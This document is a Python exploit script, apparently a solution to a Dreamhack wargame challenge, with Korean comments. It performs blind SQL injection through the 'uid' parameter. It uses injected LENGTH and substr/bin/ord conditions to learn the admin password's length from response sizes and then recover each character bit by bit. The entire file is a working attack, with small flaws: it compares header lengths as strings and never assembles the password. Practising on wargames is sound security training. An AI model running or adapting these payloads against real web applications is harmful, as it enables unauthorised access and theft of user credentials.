import requests, string

#GET 방식으로 동작
target_url = f"http://host3.dreamhack.games:10005/"

#패스워드 길이 초기화
upw_len = 1

#패스워드가 아닐 경우의 Content-Length 길이 저장
#Content-Length의 동작이 다를 경우 패스워드 길이로 유추
#여기서는 패스워드 아닌 값 [214-215], 패스워드 동작 값 -
content_len = ""

#사용자 패스워드 길이
while(1):
    print(f"upw_len: {upw_len}")
    payload = f"admin' AND LENGTH(upw) ={upw_len}#"
    param = {
        #http://host3.dreamhack.games:10005/?uid=
        'uid':payload,
    }
    response = requests.get(target_url, params=param)
    if upw_len == 1:
        content_len = response.headers["Content-Length"]
        content_length_int = int(content_len)
        content_margin = content_length_int + 10
        content_len = str(content_margin)
        
        print(f"Content-Length: {content_len}")
        upw_len = upw_len + 1
        continue
    
    #Content-Length 비교를 위한 변수
    content_com = response.headers["Content-Length"]
    #print(f"content_len: {content_len}, content_com: {content_com}")
    if content_len < content_com:
        break
    else:
        upw_len = upw_len + 1

print(f"[*]upw_len: {upw_len}")

password="" #패스워드 값
for i in range(1,upw_len+1):
    bit_len=0 #비트 길이 초기화

    while(True):
        bit_len += 1 
        payload= f"admin' and LENGTH(bin(ord(substr(upw,{i},1))))={bit_len}; --"
        param={
            'uid': payload
        }

        response = requests.get(target_url,params=param)
        #exists라는 응답 텍스트가 확인하여 참 값인지 확인
        if 'exists' in response.text:
            break
        
    print(f"{i}번째 pwd(문자 비트): {bit_len}")
    
    
    bits=""
    for j in range(1,bit_len+1):

        payload= f"admin' and substr(bin(ord(substr(upw,{i},1))),{j},1)='1'; -- "
        param={
            'uid': payload
        }
        
        response = requests.get(target_url,params=param)
        if 'exists' in response.text:
            bits+='1'
        else:
            bits+='0'

    print(f"-> {bits}")

###참고###
#string.ascii_letters: 영어 알파벳 소문자, 대문자 모두를 출력
#string.digits: 십진수 0 ~ 9 까지 출력
#string.punctuation: 특수 문자 출력
#target_chr = string.ascii_letters + string.digits + string.punctuation